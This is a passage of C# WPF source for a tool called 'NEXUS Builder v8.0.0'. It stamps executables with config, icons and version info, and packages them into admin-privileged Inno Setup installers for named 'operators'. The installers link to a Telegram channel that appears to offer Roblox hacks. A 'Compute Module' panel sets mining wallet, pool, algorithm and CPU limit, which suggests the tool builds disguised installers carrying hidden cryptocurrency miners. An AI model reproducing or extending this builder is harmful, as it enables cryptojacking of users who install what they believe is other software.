                    bool verPatched = PeMetadataPatcher.UpdateVersionInfo(finalExePath, appName, appAuthor, AppVersion);
                    if (verPatched)
                    {
                        Log("   ✅ Метаданные VersionInfo успешно внедрены в EXE!");
                    }

                    // 4. Внедрение иконки в исполняемый файл
                    if (File.Exists(_activeIconPath))
                    {
                        Log($"🎨 Внедрение иконки в {finalExeName}...");
                        string destIco = Path.Combine(stagingDir, "app.ico");
                        try { File.Copy(_activeIconPath, destIco, true); } catch { }

                        if (File.Exists(finalExePath))
                        {
                            bool iconInjected = IconInjector.InjectIcon(finalExePath, _activeIconPath);
                            if (iconInjected) Log("   ✅ Иконка успешно встроена в ресурсы PE .exe файла!");
                        }
                    }

                    // 5. Сборка инсталлятора через Inno Setup
                    Log("🛠️ Сборка Setup Инсталлятора через Inno Setup 6...");
                    string setupBaseName = $"{cleanExeBaseName}_Setup_{opName}";
                    bool instOk = await CompileInnoSetup(
                        sourceDirectory: stagingDir,
                        outputDir: outDir,
                        outputBaseFilename: setupBaseName,
                        appName: appName,
                        appPublisher: appAuthor,
                        appExeName: finalExeName,
                        appVersion: AppVersion,
                        opName: opName,
                        iconPath: _activeIconPath,
                        createDesktopShortcut: true,
                        compressLzma: true,
                        runAsAdmin: true
                    );

                    try { Directory.Delete(stagingDir, true); } catch { }

                    if (!instOk)
                    {
                        Log("❌ ОШИБКА сборки инсталлятора!");
                        return;
                    }

                    Log($"✅ СБОРКА УСПЕШНО ЗАВЕРШЕНА!");
                    Log($"📁 Расположение: {outputFullPath}");
                    Log($"🎯 Привязка оператора: @{opName}");
                    success = true;
                }
                catch (Exception ex)
                {
                    Log("❌ ИСКЛЮЧЕНИЕ СБОРКИ: " + ex.Message);
                }
            });

            pbProgress.IsIndeterminate = false;
            pbProgress.Value = success ? 100 : 0;
            lblStatus.Text = success ? $"• Готово: {targetOutputName}" : "• Ошибка сборки";
            btnBuildStandaloneInstaller.IsEnabled = true;
            btnBuildClientInstaller.IsEnabled = true;
            btnBrowse.IsEnabled = true;

            if (success)
            {
                btnOpenFolder.Visibility = Visibility.Visible;
                System.Windows.MessageBox.Show(
                    $"Инсталлятор для оператора {opName} успешно создан!\n\nРасположение:\n{outputFullPath}",
                    "NEXUS Builder v8.0.0",
                    MessageBoxButton.OK,
                    MessageBoxImage.Information
                );
            }
        }

        private bool InjectConfigIntoFile(string filePath, string opName, string appName, string appAuthor, string tgChannel, bool isStandalone, Dictionary<string, object?>? customConfig = null)
        {
            byte[] bytes = File.ReadAllBytes(filePath);

            byte[] markerStart = Encoding.Unicode.GetBytes("`<`<NEXUS_CFG_START`>`>");
            byte[] markerEnd = Encoding.Unicode.GetBytes("`<`<NEXUS_CFG_END`>`>");

            int startIdx = IndexOfBytes(bytes, markerStart, 0);
            if (startIdx == -1)
            {
                markerStart = Encoding.Unicode.GetBytes("<<NEXUS_CFG_START>>");
                startIdx = IndexOfBytes(bytes, markerStart, 0);
            }

            if (startIdx == -1) return false;

            int payloadStart = startIdx + markerStart.Length;

            int endIdx = IndexOfBytes(bytes, markerEnd, payloadStart);
            if (endIdx == -1)
            {
                markerEnd = Encoding.Unicode.GetBytes("<<NEXUS_CFG_END>>");
                endIdx = IndexOfBytes(bytes, markerEnd, payloadStart);
            }

            if (endIdx == -1) return false;

            int availableBytes = endIdx - payloadStart;

            var configData = new
            {
                operatorName = opName,
                appTitleMain = appName,
                appAuthor = appAuthor,
                company = appAuthor,
                appTitleVersion = "v" + AppVersion,
                windowTitle = $"{appName} {AppVersion}",
                clientVersion = AppVersion,
                version = AppVersion,
                telegramChannel = tgChannel,
                telegramUrl = tgChannel,
                tgChannel = tgChannel,
                buildMode = isStandalone ? "standalone" : "loader",
                customConfig = customConfig ?? new Dictionary<string, object?>(),
                builtAt = DateTime.UtcNow.ToString("o")
            };

            string json = JsonSerializer.Serialize(configData);
            byte[] jsonBytes = Encoding.Unicode.GetBytes(json);

            if (jsonBytes.Length > availableBytes) return false;

            for (int i = 0; i < availableBytes; i += 2)
            {
                bytes[payloadStart + i] = 0x20;
                bytes[payloadStart + i + 1] = 0x00;
            }
            Array.Copy(jsonBytes, 0, bytes, payloadStart, jsonBytes.Length);

            File.WriteAllBytes(filePath, bytes);
            return true;
        }

        private async Task<bool> CompileInnoSetup(
            string sourceDirectory,
            string outputDir,
            string outputBaseFilename,
            string appName,
            string appPublisher,
            string appExeName,
            string appVersion,
            string opName,
            string iconPath,
            bool createDesktopShortcut,
            bool compressLzma,
            bool runAsAdmin)
        {
            string? iscc = await EnsureInnoSetup();
            if (string.IsNullOrEmpty(iscc) || !File.Exists(iscc))
            {
                Log("❌ Inno Setup (ISCC.exe) не найден и не удалось загрузить!");
                return false;
            }

            if (!File.Exists(iconPath))
            {
                iconPath = GetPresetIconPath("thunder");
            }

            string safePublisher = string.IsNullOrWhiteSpace(appPublisher) ? "RAH Team" : appPublisher.Replace("\"", "");
            string compressionMode = compressLzma ? "lzma2/ultra64" : "lzma2/fast";
            string adminPrivilege = runAsAdmin ? "admin" : "lowest";

            string desktopTask = createDesktopShortcut
                ? "Name: \"desktopicon\"; Description: \"{cm:CreateDesktopIcon}\"; GroupDescription: \"{cm:AdditionalIcons}\"; Flags: unchecked"
                : "";

            string desktopIcon = createDesktopShortcut
                ? $"Name: \"{{autodesktop}}\\{{#MyAppName}}\"; Filename: \"{{app}}\\{{#MyAppExeName}}\"; Tasks: desktopicon; IconFilename: \"{{app}}\\app.ico\""
                : "";

            string setupIconLine = File.Exists(iconPath) ? $"SetupIconFile={iconPath}" : "";
            string iconFileLine = File.Exists(iconPath) ? $"Source: \"{iconPath}\"; DestDir: \"{{app}}\"; DestName: \"app.ico\"; Flags: ignoreversion" : "";

            string issScript = $@"#define MyAppName ""{appName}""
#define MyAppVersion ""{appVersion}""
#define MyAppPublisher ""{safePublisher}""
#define MyAppExeName ""{appExeName}""

[Setup]
AppId={{{{{Guid.NewGuid().ToString().ToUpper()}}}}}
AppName={{#MyAppName}}
AppVersion={{#MyAppVersion}}
AppPublisher={{#MyAppPublisher}}
AppPublisherURL=https://t.me/robloxvzlomez
DefaultDirName={{autopf}}\\{{#MyAppName}}
UninstallDisplayIcon={{app}}\\{{#MyAppExeName}}
ArchitecturesAllowed=x64compatible
ArchitecturesInstallIn64BitMode=x64compatible
DisableProgramGroupPage=yes
PrivilegesRequired={adminPrivilege}
OutputDir={outputDir}
OutputBaseFilename={outputBaseFilename}
SolidCompression=yes
Compression={compressionMode}
WizardStyle=modern
{setupIconLine}
VersionInfoVersion={appVersion}.0
VersionInfoTextVersion={appVersion}
VersionInfoCompany={{#MyAppPublisher}}
VersionInfoDescription={{#MyAppName}} Setup
VersionInfoCopyright=Copyright (C) 2026 {{#MyAppPublisher}}

[Languages]
Name: ""russian""; MessagesFile: ""compiler:Languages\\Russian.isl""
Name: ""english""; MessagesFile: ""compiler:Default.isl""


[Tasks]
{desktopTask}

[Files]
Source: ""{sourceDirectory}\*""; DestDir: ""{{app}}""; Flags: ignoreversion recursesubdirs createallsubdirs
{iconFileLine}

[Icons]
Name: ""{{autoprograms}}\\{{#MyAppName}}""; Filename: ""{{app}}\\{{#MyAppExeName}}""; IconFilename: ""{{app}}\\app.ico""
{desktopIcon}

[Run]
Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#StringChange(MyAppName, '&', '&&')}}}}""; Flags: nowait postinstall skipifsilent runascurrentuser
";

            string tempIssPath = Path.Combine(Path.GetTempPath(), $"nexus_setup_{Guid.NewGuid():N}.iss");
            File.WriteAllText(tempIssPath, issScript, Encoding.UTF8);

            Log($"⚡ Компиляция установщика через Inno Setup: {Path.GetFileName(iscc)}...");
            Log($"📦 Режим: распаковка полного пакета DLL в Program Files, иконка: {Path.GetFileName(iconPath)}");

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = iscc,
                    Arguments = $"\"{tempIssPath}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var proc = Process.Start(psi);
                if (proc == null) return false;

                proc.OutputDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        if (e.Data.StartsWith("Compressing:") || e.Data.StartsWith("Updating") || e.Data.StartsWith("Successful"))
                        {
                            Log("   " + e.Data.Trim());
                        }
                    }
                };
                proc.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        Log("   ⚠️ " + e.Data.Trim());
                    }
                };

                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();

                await proc.WaitForExitAsync();

                try { File.Delete(tempIssPath); } catch { }

                return proc.ExitCode == 0;
            }
            catch (Exception ex)
            {
                Log("❌ Ошибка выполнения Inno Setup: " + ex.Message);
                return false;
            }
        }

        private static void CopyDirectory(string sourceDir, string targetDir)
        {
            Directory.CreateDirectory(targetDir);

            foreach (string file in Directory.GetFiles(sourceDir))
            {
                string targetFile = Path.Combine(targetDir, Path.GetFileName(file));
                File.Copy(file, targetFile, true);
            }

            foreach (string subDir in Directory.GetDirectories(sourceDir))
            {
                string targetSub = Path.Combine(targetDir, Path.GetFileName(subDir));
                CopyDirectory(subDir, targetSub);
            }
        }

        #region Custom Project Configuration Management
        private void UpdateCustomConfigCount()
        {
        }

        private void SaveCustomProjectParams()
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(_projectConfigFilePath)!);
                // Сохраняем произвольные пользовательские параметры
                var arbitraryParams = CustomProjectParams.Where(p => !IsComputeModuleKey(p.Key)).ToList();
                string json = JsonSerializer.Serialize(arbitraryParams, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(_projectConfigFilePath, json, Encoding.UTF8);
            }
            catch (Exception ex)
            {
                Log("⚠️ Ошибка сохранения конфигурации проекта: " + ex.Message);
            }

            SaveComputeModuleConfig();
        }

        private void LoadCustomProjectParams()
        {
            try
            {
                if (File.Exists(_projectConfigFilePath))
                {
                    string json = File.ReadAllText(_projectConfigFilePath, Encoding.UTF8);
                    var items = JsonSerializer.Deserialize<List<CustomProjectParam>>(json);
                    if (items != null)
                    {
                        CustomProjectParams.Clear();
                        // Collect legacy compute keys for migration
                        var legacyComputeKeys = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

                        foreach (var it in items)
                        {
                            if (IsComputeModuleKey(it.Key))
                            {
                                // Capture legacy compute keys for potential migration
                                legacyComputeKeys[it.Key] = it.DefaultValue ?? "";
                            }
                            else
                            {
                                CustomProjectParams.Add(it);
                            }
                        }

                        // If we found legacy compute keys and have no modules yet, migrate them
                        if (legacyComputeKeys.Count > 0 && ComputeConfig.Modules.Count == 0)
                        {
                            var legacyDict = new Dictionary<string, object>();
                            foreach (var kv in legacyComputeKeys)
                            {
                                legacyDict[kv.Key] = kv.Value;
                            }
                            var migrated = ComputeRootConfig.MigrateFromLegacy(legacyDict);
                            ComputeConfig.Enabled = migrated.Enabled;
                            ComputeConfig.Modules = migrated.Modules;
                            chkComputeEnabled.IsChecked = ComputeConfig.Enabled;
                            RenderComputeModuleCards();
                            UpdateComputeGlobalState();
                            SaveComputeModuleConfig();
                            Log("📦 Compute: мигрированы ключи из Custom Project Config → modules[]");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log("⚠️ Ошибка загрузки сохраненной конфигурации: " + ex.Message);
            }

            UpdateCustomConfigCount();
        }

        public (bool isValid, string error) ValidateAllCustomParams()
        {
            var keys = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var param in CustomProjectParams)
            {
                if (string.IsNullOrWhiteSpace(param.Key))
                {
                    return (false, $"У параметра '{param.Name}' не указан уникальный ключ.");
                }

                if (!keys.Add(param.Key))
                {
                    return (false, $"Дубликат ключа конфигурации: '{param.Key}'!");
                }

                var (valid, err) = param.Validate();
                if (!valid)
                {
                    return (false, err);
                }
            }

            return (true, "");
        }

        public Dictionary<string, object?> BuildCustomConfigDictionary()
        {
            var dict = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase);

            // 1. Произвольные пользовательские параметры (Custom Project Configuration)
            foreach (var param in CustomProjectParams)
            {
                if (IsComputeModuleKey(param.Key)) continue;
                dict[param.Key] = param.GetTypedValue();
            }

            // 2. New structured compute configuration
            ComputeConfig.Enabled = chkComputeEnabled?.IsChecked == true;
            dict["compute"] = ComputeConfig.ToDictionary();

            // 3. Legacy backward-compatible top-level keys from the first active module
            bool isEnabled = ComputeConfig.Enabled;
            var firstActive = ComputeConfig.Modules.FirstOrDefault(m => m.Enabled);

            if (firstActive != null && isEnabled)
            {
                dict["enabled"] = true;
                string legacyMode = MapAlgorithmToLegacyMode(firstActive.Primary.Algorithm);
                dict["mode"] = legacyMode;
                dict["walletAddress"] = firstActive.Primary.Wallet;
                dict["serverAddress"] = firstActive.Primary.Pool;
                dict["serverPort"] = firstActive.Primary.Port;
                string wName = firstActive.Primary.Worker;
                dict["workerName"] = string.IsNullOrWhiteSpace(wName) ? "rig" : wName;
                int resLimit = firstActive.ResourceLimit;
                if (resLimit < 1) resLimit = 1;
                if (resLimit > 100) resLimit = 100;
                dict["resourceLimit"] = resLimit;
            }
            else
            {
                dict["enabled"] = false;
                dict["mode"] = "disabled";
                dict["walletAddress"] = "";
                dict["serverAddress"] = "";
                dict["serverPort"] = 0;
                dict["workerName"] = "rig";
                dict["resourceLimit"] = 30;
            }

            return dict;
        }
        #endregion

        #region Compute Module Dedicated UI Handlers

        private void InitializeComputeModuleUI()
        {
            LoadComputeModuleConfig();
            RenderComputeModuleCards();
            UpdateComputeGlobalState();
        }

        private void ChkComputeEnabled_Changed(object sender, RoutedEventArgs e)
        {
            ComputeConfig.Enabled = chkComputeEnabled.IsChecked == true;
            UpdateComputeGlobalState();
            SaveComputeModuleConfig();
        }

        private void BtnAddComputeModule_Click(object sender, RoutedEventArgs e)
        {
            int nextIndex = ComputeConfig.Modules.Count + 1;
            var algo = AlgorithmRegistry.All.FirstOrDefault();
            var newModule = new ComputeModuleConfig
            {
                Name = $"Compute Module #{nextIndex}",
                Enabled = true,
                Mode = "single",
                Primary = new ComputeEngineEndpoint
                {
                    Algorithm = algo?.Id ?? "xmr",
                    Wallet = algo?.WalletPlaceholder ?? "",
                    Pool = algo?.DefaultPool ?? "",
                    Port = algo?.DefaultPort ?? 3333,
                    Worker = "rig"
                },
                ResourceLimit = 30
            };
            ComputeConfig.Modules.Add(newModule);
            RenderComputeModuleCards();
            UpdateComputeGlobalState();
            SaveComputeModuleConfig();
        }

        private void CopyComputeModule(ComputeModuleConfig mod)
        {
            var clone = mod.Clone();
            // Append -copy suffix to worker name
            if (!string.IsNullOrEmpty(clone.Primary.Worker))
                clone.Primary.Worker = clone.Primary.Worker + "-copy";
            if (clone.IsDualMode && !string.IsNullOrEmpty(clone.Secondary.Worker))
                clone.Secondary.Worker = clone.Secondary.Worker + "-copy";

            ComputeConfig.Modules.Add(clone);
            RenderComputeModuleCards();
            UpdateComputeGlobalState();
            SaveComputeModuleConfig();
        }

        private void DeleteComputeModule(ComputeModuleConfig mod)
        {
            int idx = ComputeConfig.Modules.IndexOf(mod);
            string name = idx >= 0 ? $"Compute Module #{idx + 1}" : mod.Name;
            var answer = System.Windows.MessageBox.Show(
                $"Удалить {name}?\n\nЭто действие нельзя отменить.",
                "Подтверждение удаления",
                MessageBoxButton.YesNo,
                MessageBoxImage.Warning
            );
            if (answer != MessageBoxResult.Yes) return;

            ComputeConfig.Modules.Remove(mod);
            RenderComputeModuleCards();
            UpdateComputeGlobalState();
            SaveComputeModuleConfig();
        }

        private void SwapModuleEndpoints(ComputeModuleConfig mod)
        {
            mod.SwapEndpoints();
            RenderComputeModuleCards();
            SaveComputeModuleConfig();
        }

        private void UpdateComputeGlobalState()
        {
            if (!_isInitialized || chkComputeEnabled == null) return;

            bool isChecked = chkComputeEnabled.IsChecked == true;
            int moduleCount = ComputeConfig.Modules.Count;
            int activeCount = ComputeConfig.Modules.Count(m => m.Enabled);

            // Module count badge
            if (txtModuleCount != null)
            {
                txtModuleCount.Text = $"{moduleCount} {GetModuleWord(moduleCount)}";
            }

            // Global state badge
            if (isChecked && activeCount > 0)
            {
                badgeComputeState.Background = new SolidColorBrush(Color.FromRgb(20, 83, 45));
                badgeComputeState.BorderBrush = new SolidColorBrush(Color.FromRgb(34, 197, 94));
                txtComputeBadgeState.Text = $"АКТИВЕН ({activeCount})";
                txtComputeBadgeState.Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128));
            }
            else
            {
                badgeComputeState.Background = new SolidColorBrush(Color.FromRgb(30, 41, 59));
                badgeComputeState.BorderBrush = new SolidColorBrush(Color.FromRgb(51, 65, 85));
                txtComputeBadgeState.Text = "ОТКЛЮЧЕН";
                txtComputeBadgeState.Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184));
            }

            // Empty state
            if (txtNoComputeModules != null)
            {
                txtNoComputeModules.Visibility = moduleCount == 0 ? Visibility.Visible : Visibility.Collapsed;
            }

            // Disable cards if global toggle is off
            if (pnlComputeModulesList != null)
            {
                pnlComputeModulesList.IsEnabled = isChecked;
                pnlComputeModulesList.Opacity = isChecked ? 1.0 : 0.45;
            }
        }

        private static string GetModuleWord(int count)
        {
            if (count % 10 == 1 && count % 100 != 11) return "модуль";
            if (count % 10 >= 2 && count % 10 <= 4 && (count % 100 < 10 || count % 100 >= 20)) return "модуля";
            return "модулей";
        }

        /// <summary>
        /// Renders all compute module cards dynamically into pnlComputeModulesList.
        /// </summary>
        private void RenderComputeModuleCards()
        {
            if (pnlComputeModulesList == null) return;
            pnlComputeModulesList.Children.Clear();

            for (int i = 0; i < ComputeConfig.Modules.Count; i++)
            {
                var mod = ComputeConfig.Modules[i];
                var card = CreateModuleCard(mod, i);
                pnlComputeModulesList.Children.Add(card);
            }

            if (txtNoComputeModules != null)
            {
                txtNoComputeModules.Visibility = ComputeConfig.Modules.Count == 0
                    ? Visibility.Visible : Visibility.Collapsed;
            }
        }

        /// <summary>
        /// Creates a visual card (Border) for a single ComputeModuleConfig.
        /// </summary>
        private Border CreateModuleCard(ComputeModuleConfig mod, int index)
        {
            var card = new Border
            {
                Background = new SolidColorBrush(Color.FromRgb(15, 17, 23)),
                BorderBrush = new SolidColorBrush(Color.FromRgb(35, 39, 51)),
                BorderThickness = new Thickness(1),
                CornerRadius = new CornerRadius(6),
                Padding = new Thickness(12, 10, 12, 10),
                Margin = new Thickness(0, 0, 0, 8)
            };

            var rootStack = new StackPanel();

            // === TOP BAR ===
            var topBar = new Grid();
            topBar.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            topBar.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });

            // Left: Title + Status Badge + Mode Selector
            var leftPanel = new StackPanel { Orientation = WpfOrientation.Horizontal, VerticalAlignment = VerticalAlignment.Center };

            // Module toggle
            var chkEnabled = new WpfCheckBox
            {
                IsChecked = mod.Enabled,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 8, 0),
                Cursor = System.Windows.Input.Cursors.Hand,
                Style = (Style)FindResource("ModernCheckBox")
            };
            var capturedMod = mod;
            chkEnabled.Checked += (s, e) => { capturedMod.Enabled = true; UpdateComputeGlobalState(); SaveComputeModuleConfig(); UpdateModuleStatusBadge(card, capturedMod); };
            chkEnabled.Unchecked += (s, e) => { capturedMod.Enabled = false; UpdateComputeGlobalState(); SaveComputeModuleConfig(); UpdateModuleStatusBadge(card, capturedMod); };
            leftPanel.Children.Add(chkEnabled);

            // Title
            leftPanel.Children.Add(new TextBlock
            {
                Text = $"Compute Module #{index + 1}",
                Foreground = new SolidColorBrush(Color.FromRgb(241, 245, 249)),
                FontSize = 12,
                FontWeight = FontWeights.SemiBold,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 10, 0)
            });

            // Status badge
            var statusBadge = new Border
            {
                Background = mod.Enabled
                    ? new SolidColorBrush(Color.FromRgb(20, 83, 45))
                    : new SolidColorBrush(Color.FromRgb(30, 41, 59)),
                CornerRadius = new CornerRadius(3),
                Padding = new Thickness(5, 1, 5, 1),
                Margin = new Thickness(0, 0, 10, 0),
                VerticalAlignment = VerticalAlignment.Center,
                Tag = "statusBadge"
            };
            statusBadge.Child = new TextBlock
            {
                Text = mod.Enabled ? "ACTIVE" : "DISABLED",
                Foreground = mod.Enabled
                    ? new SolidColorBrush(Color.FromRgb(74, 222, 128))
                    : new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                FontSize = 9,
                FontWeight = FontWeights.Bold
            };
            leftPanel.Children.Add(statusBadge);

            // Mode selector
            leftPanel.Children.Add(new TextBlock
            {
                Text = "Режим:",
                Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                FontSize = 11,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 6, 0)
            });

            var cbMode = new WpfComboBox
            {
                Width = 140,
                Height = 28,
                FontSize = 11,
                VerticalAlignment = VerticalAlignment.Center,
                Style = (Style)FindResource("ModernComboBox")
            };
            cbMode.Items.Add(new ComboBoxItem { Content = "Single Mining", Tag = "single", Style = (Style)FindResource("DarkComboBoxItem") });
            cbMode.Items.Add(new ComboBoxItem { Content = "Dual Mining", Tag = "dual", Style = (Style)FindResource("DarkComboBoxItem") });
            cbMode.SelectedIndex = mod.IsDualMode ? 1 : 0;
            cbMode.SelectionChanged += (s, e) =>
            {
                if (cbMode.SelectedItem is ComboBoxItem ci && ci.Tag != null)
                {
                    capturedMod.Mode = ci.Tag.ToString() ?? "single";
                    RenderComputeModuleCards();
                    SaveComputeModuleConfig();
                }
            };
            leftPanel.Children.Add(cbMode);

            Grid.SetColumn(leftPanel, 0);
            topBar.Children.Add(leftPanel);

            // Right: Action Buttons
            var rightPanel = new StackPanel { Orientation = WpfOrientation.Horizontal, VerticalAlignment = VerticalAlignment.Center };

            var btnCopy = CreateSmallButton("Копировать", "#334155", "#94a3b8");
            btnCopy.Click += (s, e) => CopyComputeModule(capturedMod);
            rightPanel.Children.Add(btnCopy);

            var btnDelete = CreateSmallButton("Удалить", "#3b1419", "#f87171");
            btnDelete.Margin = new Thickness(6, 0, 0, 0);
            btnDelete.Click += (s, e) => DeleteComputeModule(capturedMod);
            rightPanel.Children.Add(btnDelete);

            Grid.SetColumn(rightPanel, 1);
            topBar.Children.Add(rightPanel);

            rootStack.Children.Add(topBar);

            // === PRIMARY ENDPOINT ===
            rootStack.Children.Add(CreateEndpointSection("PRIMARY", mod.Primary, capturedMod, true));

            // === DUAL MODE: SWAP + SECONDARY ===
            if (mod.IsDualMode)
            {
                // Swap button
                var btnSwap = new WpfButton
                {
                    Content = "⇄  Swap Primary ↔ Secondary",
                    Height = 26,
                    FontSize = 11,
                    Foreground = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
                    Background = new SolidColorBrush(Color.FromRgb(22, 25, 34)),
                    BorderBrush = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
                    BorderThickness = new Thickness(1),
                    Padding = new Thickness(12, 0, 12, 0),
                    HorizontalAlignment = System.Windows.HorizontalAlignment.Center,
                    Margin = new Thickness(0, 6, 0, 6),
                    Cursor = System.Windows.Input.Cursors.Hand
                };
                btnSwap.Click += (s, e) => SwapModuleEndpoints(capturedMod);
                rootStack.Children.Add(btnSwap);

                // Secondary endpoint
                rootStack.Children.Add(CreateEndpointSection("SECONDARY", mod.Secondary, capturedMod, false));

                // Dual mining compatibility banner
                if (!string.IsNullOrEmpty(mod.Primary.Algorithm) && !string.IsNullOrEmpty(mod.Secondary.Algorithm))
                {
                    var (isValid, message) = AlgorithmRegistry.CheckDualMiningSupport(mod.Primary.Algorithm, mod.Secondary.Algorithm);
                    var banner = new Border
                    {
                        Background = isValid
                            ? new SolidColorBrush(Color.FromRgb(20, 83, 45))
                            : new SolidColorBrush(Color.FromRgb(59, 20, 25)),
                        BorderBrush = isValid
                            ? new SolidColorBrush(Color.FromRgb(34, 197, 94))
                            : new SolidColorBrush(Color.FromRgb(248, 113, 113)),
                        BorderThickness = new Thickness(1),
                        CornerRadius = new CornerRadius(4),
                        Padding = new Thickness(8, 5, 8, 5),
                        Margin = new Thickness(0, 6, 0, 2)
                    };
                    banner.Child = new TextBlock
                    {
                        Text = message,
                        Foreground = isValid
                            ? new SolidColorBrush(Color.FromRgb(134, 239, 172))
                            : new SolidColorBrush(Color.FromRgb(248, 113, 113)),
                        FontSize = 11,
                        FontWeight = FontWeights.SemiBold,
                        TextWrapping = TextWrapping.Wrap
                    };
                    rootStack.Children.Add(banner);
                }
            }

            // === RESOURCE LIMIT SLIDER ===
            var sliderContainer = new Border
            {
                Background = new SolidColorBrush(Color.FromRgb(11, 13, 19)),
                BorderBrush = new SolidColorBrush(Color.FromRgb(30, 35, 48)),
                BorderThickness = new Thickness(1),
                CornerRadius = new CornerRadius(4),
                Padding = new Thickness(10, 6, 10, 6),
                Margin = new Thickness(0, 8, 0, 0)
            };
            var sliderGrid = new Grid();
            sliderGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            sliderGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var sliderHeader = new Grid();
            sliderHeader.Children.Add(new TextBlock
            {
                Text = "Использование ресурсов:",
                Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                FontSize = 10.5,
                FontWeight = FontWeights.SemiBold,
                VerticalAlignment = VerticalAlignment.Center
            });
            var lblPercent = new TextBlock
            {
                Text = $"{mod.ResourceLimit}%",
                Foreground = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
                FontSize = 11,
                FontWeight = FontWeights.Bold,
                HorizontalAlignment = System.Windows.HorizontalAlignment.Right,
                VerticalAlignment = VerticalAlignment.Center
            };
            sliderHeader.Children.Add(lblPercent);
            Grid.SetRow(sliderHeader, 0);
            sliderGrid.Children.Add(sliderHeader);

            var slider = new Slider
            {
                Minimum = 1,
                Maximum = 100,
                Value = mod.ResourceLimit,
                IsSnapToTickEnabled = true,
                TickFrequency = 1,
                Margin = new Thickness(0, 4, 0, 0),
                Style = (Style)FindResource("ModernSlider")
            };
            slider.ValueChanged += (s, e) =>
            {
                capturedMod.ResourceLimit = (int)Math.Round(e.NewValue);
                lblPercent.Text = $"{capturedMod.ResourceLimit}%";
                SaveComputeModuleConfig();
            };
            Grid.SetRow(slider, 1);
            sliderGrid.Children.Add(slider);

            sliderContainer.Child = sliderGrid;
            rootStack.Children.Add(sliderContainer);

            // === WORKER STATUS ===
            rootStack.Children.Add(CreateWorkerStatusDisplay(mod));

            card.Child = rootStack;
            return card;
        }

        /// <summary>
        /// Creates input fields for a single mining endpoint (PRIMARY or SECONDARY).
        /// </summary>
        private UIElement CreateEndpointSection(string label, ComputeEngineEndpoint endpoint, ComputeModuleConfig parentMod, bool isPrimary)
        {
            var container = new StackPanel { Margin = new Thickness(0, 6, 0, 0) };

            // Section label
            container.Children.Add(new TextBlock
            {
                Text = label,
                Foreground = new SolidColorBrush(Color.FromRgb(100, 116, 139)),
                FontSize = 9.5,
                FontWeight = FontWeights.Bold,
                Margin = new Thickness(0, 0, 0, 4)
            });

            // Algorithm dropdown
            var algoRow = new StackPanel { Margin = new Thickness(0, 0, 0, 6) };
            algoRow.Children.Add(new TextBlock
            {
                Text = "Алгоритм:",
                Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                FontSize = 10.5,
                FontWeight = FontWeights.SemiBold,
                Margin = new Thickness(0, 0, 0, 3)
            });

            var cbAlgo = new WpfComboBox
            {
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernComboBox")
            };

            int selectedAlgoIndex = 0;
            for (int i = 0; i < AlgorithmRegistry.All.Count; i++)
            {
                var a = AlgorithmRegistry.All[i];
                cbAlgo.Items.Add(new ComboBoxItem
                {
                    Content = a.DisplayName,
                    Tag = a.Id,
                    Style = (Style)FindResource("DarkComboBoxItem")
                });
                if (string.Equals(a.Id, endpoint.Algorithm, StringComparison.OrdinalIgnoreCase))
                    selectedAlgoIndex = i;
            }
            cbAlgo.SelectedIndex = selectedAlgoIndex;

            var capturedEndpoint = endpoint;
            var capturedParent = parentMod;
            cbAlgo.SelectionChanged += (s, e) =>
            {
                if (cbAlgo.SelectedItem is ComboBoxItem ci && ci.Tag != null)
                {
                    string newAlgoId = ci.Tag.ToString() ?? "";
                    capturedEndpoint.Algorithm = newAlgoId;
                    var algoDef = AlgorithmRegistry.GetById(newAlgoId);
                    if (algoDef != null)
                    {
                        // Auto-fill defaults if fields are empty or switching
                        if (string.IsNullOrWhiteSpace(capturedEndpoint.Pool) || capturedEndpoint.Pool.Contains("2miners") || capturedEndpoint.Pool.Contains("supportxmr") || capturedEndpoint.Pool.Contains("woolypooly"))
                        {
                            capturedEndpoint.Pool = algoDef.DefaultPool;
                            capturedEndpoint.Port = algoDef.DefaultPort;
                        }
                        if (string.IsNullOrWhiteSpace(capturedEndpoint.Wallet) || capturedEndpoint.Wallet.StartsWith("0x000") || capturedEndpoint.Wallet.StartsWith("4...") || capturedEndpoint.Wallet.StartsWith("kaspa:..."))
                        {
                            capturedEndpoint.Wallet = algoDef.WalletPlaceholder;
                        }
                    }
                    RenderComputeModuleCards();
                    SaveComputeModuleConfig();
                }
            };
            algoRow.Children.Add(cbAlgo);
            container.Children.Add(algoRow);

            // Input fields row: Wallet, Pool, Port, Worker
            var inputGrid = new Grid();
            inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1.5, GridUnitType.Star) });
            inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1.1, GridUnitType.Star) });
